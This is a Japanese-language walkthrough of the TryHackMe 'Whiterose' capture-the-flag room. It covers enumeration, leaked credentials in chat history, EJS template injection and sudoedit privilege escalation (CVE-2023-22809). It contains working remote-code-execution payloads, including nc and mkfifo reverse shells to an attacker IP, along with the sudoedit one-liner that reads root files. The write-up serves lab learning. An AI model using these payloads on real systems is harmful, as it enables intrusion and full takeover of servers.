# Whiterose CTF

https://tryhackme.com/room/whiterose

```
And oh! I almost forgot! - You will need these: Olivia Cortez:olivi8
```

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.58.172
root@ip-10-10-58-5:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-26 06:09 GMT
Nmap scan report for 10.10.58.172
Host is up (0.0061s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:6E:9B:83:35:55 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.84 seconds
root@ip-10-10-58-5:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-26 06:10 GMT
Nmap scan report for 10.10.58.172
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
MAC Address: 02:6E:9B:83:35:55 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
```

SSH, HTTP

IP アドレスでブラウザ表示したら、http://cyprusbank.thm/ に転送される。

hosts に追加したら、メンテナンス画面が表示される。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://cyprusbank.thm -w ./dirlist.txt -t 30 -k
```

dirb でも何も出ない。

### サブドメイン検索

```shell
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -X GET -H "Host: FUZZ.cyprusbank.thm" -u http://10.10.58.172 -fs 57

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.58.172
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 57
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 263ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 298ms]
:: Progress: [4989/4989] :: Job [1/1] :: 143 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```

www, admin のサブドメインを発見。hosts に追加。  
www は同じメンテナンス画面に飛ばされる。

## admin.cyprusbank.thm

```
Olivia Cortez:olivi8
```

でログイン成功。

チャット画面で、
http://admin.cyprusbank.thm/messages/?c=5  
となっているところを
http://admin.cyprusbank.thm/messages/?c=20

にすると古いメッセージまで表示され、認証情報が表示された。

```text
DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing

Gayle Bev: Of course! My password is 'ひみつ'
```

これでログインすると、電話番号も表示される。

Settings 画面で顧客のパスワード変更ができるようになったが、何を入力しても更新成功のメッセージが出るためリクエストが処理されている手ごたえは無い。  
また、成功メッセージにパスワードが表示されるが、reflected XXS は機能しなかった。

Burp プロキシでインターセプトして、password パラメータ自体を削除して送ると、エラーが表示された。

```text
ReferenceError: /home/web/app/views/settings.ejs:14
    12|         <div class="alert alert-info mb-3"><%= message %></div>
    13|       <% } %>
 >> 14|       <% if (password != -1) { %>
    15|         <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
    16|       <% } %>
    17|       <% if (typeof error != 'undefined') { %>

password is not defined
    at eval ("/home/web/app/views/settings.ejs":27:8)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
    at /home/web/app/routes/settings.js:27:7
    at processTicksAndRejections (node:internal/process/task_queues:96:5)
```

ejs が使われていることと`<%= password %>`の部分から、EJS テンプレートインジェクションが有望と考えた。

https://sploitus.com/exploit?id=16D622A6-C7F9-52EC-8534-68952EEC5FBB

ここのコードを参考に。password 自体にペイロードを仕込むわけではなかった。

```http
name=aaa&password=aaa&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 10.2.22.182 6666');s
```

を送ると、エラーは出たが nc は実行されている。

```text
Error: /home/web/app/views/settings.ejs:1
 >> 1| <!DOCTYPE html>
    2| <html lang="en">
    3|   <head>
    4|     <%- include("../components/head"); %>

Command failed: nc -e sh 10.2.22.182 6666
nc: invalid option -- 'e'
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
	  [-m minttl] [-O length] [-P proxy_username] [-p source_port]
	  [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
	  [-X proxy_protocol] [-x proxy_address[:port]] 	  [destination] [port]

    at checkExecSyncError (node:child_process:828:11)
    at Object.execSync (node:child_process:899:15)
    at eval ("/home/web/app/views/settings.ejs":9:53)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
```

適切なリバースシェルを選択すれば実行できそうではある。

```http
name=aaa&password=bbb&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6666 >/tmp/f');s
```

構文エラー。

```
SyntaxError: Invalid or unexpected token in /home/web/app/views/settings.ejs while compiling ejs

If the above error is not helpful, you may want to try EJS-Lint:
https://github.com/RyanZim/EJS-Lint
Or, if you meant to create an async function, pass `async: true` as an option.
    at new Function (<anonymous>)
    at Template.compile (/home/web/app/node_modules/ejs/lib/ejs.js:662:12)
    at Object.compile (/home/web/app/node_modules/ejs/lib/ejs.js:396:16)
    at handleCache (/home/web/app/node_modules/ejs/lib/ejs.js:233:18)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:16)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
```

& が入っているのがまずいと思われるので URL エンコードして送る。

```http
name=aaa&password=aaa&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%36%36%36%36%20%3e%2f%74%6d%70%2f%66');s
```

リバースシェル取得成功。

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.58.172] 46512
sh: 0: can't access tty; job control turned off
$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

```shell
$ pwd
/home/web
$ ls -al
total 52
drwxr-xr-x 9 web  web  4096 Apr  4  2024 .
drwxr-xr-x 3 root root 4096 Jul 16  2023 ..
drwxr-xr-x 7 web  web  4096 Jul 17  2023 app
lrwxrwxrwx 1 web  web     9 Jul 16  2023 .bash_history -> /dev/null
-rw-r--r-- 1 web  web   220 Jul 15  2023 .bash_logout
-rw-r--r-- 1 web  web  3968 Jul 15  2023 .bashrc
drwx------ 2 web  web  4096 Dec 16  2023 .cache
drwx------ 3 web  web  4096 Dec 16  2023 .gnupg
drwxr-xr-x 3 web  web  4096 Jul 16  2023 .local
drwxrwxr-x 4 web  web  4096 Jul 16  2023 .npm
drwxrwxr-x 8 web  web  4096 Jul 15  2023 .nvm
drwxrwxr-x 5 web  web  4096 Mar 26 06:04 .pm2
-rw-r--r-- 1 web  web   807 Jul 15  2023 .profile
-rw-r--r-- 1 root root   35 Jul 15  2023 user.txt
$ cat user.txt
THM{4l..........................}
```

ユーザーフラグゲット。

## 権限昇格

```shell
web@cyprusbank:~$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

```shell
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

を実行すると、nano エディタが開く。  
sudoedit は root のファイルを安全に編集できるようにするためのツールなので、悪用できる可能性は低いのではないか？

・・・と思っていたが、脆弱性検索したらローカル権限昇格の脆弱性が出てくる。

```shell
$ searchsploit sudoedit
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation                                                                                                                               | multiple/local/11651.sh
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                                                                                                         | linux/local/37710.txt
SudoEdit 1.6.8 - Local Change Permission                                                                                                                                                                 | linux/local/470.c
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

バージョン確認

```shell
web@cyprusbank:~/app/node_modules$ sudoedit -V
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```

上で出てきた脆弱性とはバージョンが合わない。

しかし、Web 検索すると、CVE-2023-22809 が 1.9.12p1 まで有効であることが分かった。

### CVE-2023-22809

https://zenn.dev/dijk/articles/eddc840e451b68

```shell
EDITOR='vim -- /root/root.txt' sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

これでルートフラグが表示された。  
/etc/passwd を編集できるので、root ユーザーを追加することも可能。

## 振り返り

- 比較的新しい脆弱性を検索する能力が求められる。
- sudoedit に脆弱性があるという発想は無くて、ずっと別の部分を調査していたので時間がかかった。とりあえず機械的に Web 検索してみるのは大事。
